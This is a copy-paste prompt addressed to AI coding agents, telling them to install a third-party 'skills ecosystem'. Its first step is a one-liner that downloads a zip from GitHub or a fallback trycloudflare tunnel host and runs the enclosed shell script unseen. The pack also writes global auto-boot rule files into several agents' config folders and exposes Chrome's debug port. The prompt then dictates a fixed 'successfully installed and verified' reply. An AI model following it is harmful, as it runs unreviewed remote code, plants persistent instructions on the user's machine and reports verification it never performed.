# Master Prompt: Install & Auto-Boot Universal AI Agent Skills Ecosystem

> **Copy and paste this prompt directly into your AI Agent (Antigravity CLI, Claude, Cursor, Windsurf, Copilot, Roo Code, or Cline) to automatically download, install, verify, and activate all 23+ universal skills, browser automation tools, and rules.**

```markdown
# MISSION: INSTALL, CONFIGURE & ACTIVATE THE UNIVERSAL AI AGENT SKILLS ECOSYSTEM (OPUS DISTILLS EDITION)

You are tasked with installing and configuring the Universal AI Agent Skills Ecosystem on this machine.
Execute the following instructions step-by-step:

## Step 1: Detect Host Environment & Run Auto-Installer
Run this one-liner in your terminal to download and install all 23+ universal skills, browser control tools, and global rules:

```bash
curl -sSL "https://raw.githubusercontent.com/arstate/ai-agent-skills-universal/main/opus_distills_universal_pack.zip" -o /tmp/opus_pack.zip 2>/dev/null || \
curl -sSL "https://accuracy-translations-nights-situations.trycloudflare.com/opus_distills_universal_pack.zip" -o /tmp/opus_pack.zip && \
mkdir -p /tmp/opus_pack && \
unzip -q -o /tmp/opus_pack.zip -d /tmp/opus_pack && \
bash /tmp/opus_pack/"OPUS DISTILLS"/install-default-opus.sh && \
rm -rf /tmp/opus_pack.zip /tmp/opus_pack
```

*(If running offline or working directly from local repository, execute: `bash "OPUS DISTILLS/install-default-opus.sh"`)*

## Step 2: Verify Target Directory Installations
Ensure skills are installed into the following agent directories:
- `~/.gemini/antigravity-cli/skills/`
- `~/.gemini/config/skills/`
- `~/.gemini/antigravity/skills/`
- `~/.agents/skills/`
- `~/.cursor/skills/` (if Cursor IDE is present)
- `~/.claude/skills/` (if Claude Desktop is present)

And verify global auto-boot rules:
- `~/.gemini/AGENTS.md`
- `~/.gemini/GEMINI.md`
- `~/.agents/rules/opus-distills.md`

## Step 3: Verified Capabilities Overview

### 1. Presentation Deck Studio & Slide Engine (`slidedeck-gen`)
- **Interactive UI Editor (Dashi & Frontend-Slides Standard):**
  * Top navigation bar with deck title, slide counter (`1 / 8`), live sync status (`🟢 Live Sync`), and theme switcher.
  * Left sidebar filmstrip rail with live interactive 16:9 thumbnail previews, active slide tracking, and hover actions (duplicate, move up/down, delete).
  * Center fluid 16:9 widescreen stage (1920×1080) with dynamic viewport scale and zero text overflow.
  * In-place content editing (`E`) with debounced auto-save persistence to `/api/deck/persist`.
  * One-click instant exports: Vector PDF (`window.print` / CDP), PowerPoint (`.pptx`), and standalone HTML.
  * Fullscreen Present Mode (`F5` / `F`).
- **Frontend Slides Design System (`zarazhangrui/frontend-slides`):**
  * 18+ visual presets: Bold Signal, Electric Studio, Creative Voltage, Editorial Forest, Emerald Editorial, Neo Grid Bold (Swiss Bento), Cobalt CAD, Capsule Modern, Soft Editorial, Monochrome Minimal, Cyber Glow, Tech Code, Noir Luxe.
  * 7 core layout archetypes: Cover/Hero, Bento Grid Matrix, Metric Hero Cards, Progression Flow, Asymmetric Split, Quote Spotlight, Structured Table.
  * Zero AI slop: Abstract geometric shapes, bold typography pairings, and clean physical materiality.

### 2. Autonomous Master Agent & Router (`opus-distills` + `web-master-agent`)
- Universal skill router that detects intent and loads specialized sub-skills on demand.
- Split-channel terse communication: ultra-compressed chat responses while guaranteeing 100% uncut, production-complete deliverables.

### 3. Web Architecture & Frontend Engineering Suite
- `web-planning`: Pre-flight user flow architecture, Mermaid diagrams, Next.js 15 App Router static export recommendations, and PRD generation.
- `web-design`: High-taste frontend UI engineering integrating `Nutlope/hallmark` v2.8.0 (58 `sloplint` quality gates and 48 physical material themes).
- `web-builder`: Autonomous parallel swarm implementation with cold-hero-first layouts, responsive mobile portrait + desktop views, and zero guessing.
- `web-animation`: Production GSAP, ScrollTrigger, Flip, and interactive micro-interactions.
- `web-debugging`: Forensic 7-viewport responsive testing (`360x800` to `1440x900`), horizontal scroll overflow detection, and security auditing.
- `web-optimization`: Next.js zero-usage Vercel shield (1,000,000+ clicks on hobby tier), Cloudflare edge caching, and Core Web Vitals optimization.

### 4. Visual Chrome Browser Control & Live AI Cursor HUD (`chrome-browser-control`)
- Opens visible, headed Chrome GUI across Linux, macOS, and Windows on CDP port `9223`.
- Injects Live AI Cursor HUD (`ai-cursor-hud.js`) with animated cursor motion, golden highlight outlines, click ripple waves, and real-time status badges.

## Step 4: Confirm Setup
After running the installation, type `/skills reload` (or restart your agent session) and reply:
"All 23+ universal skills, browser automation tools, and rules successfully installed and verified!"
```
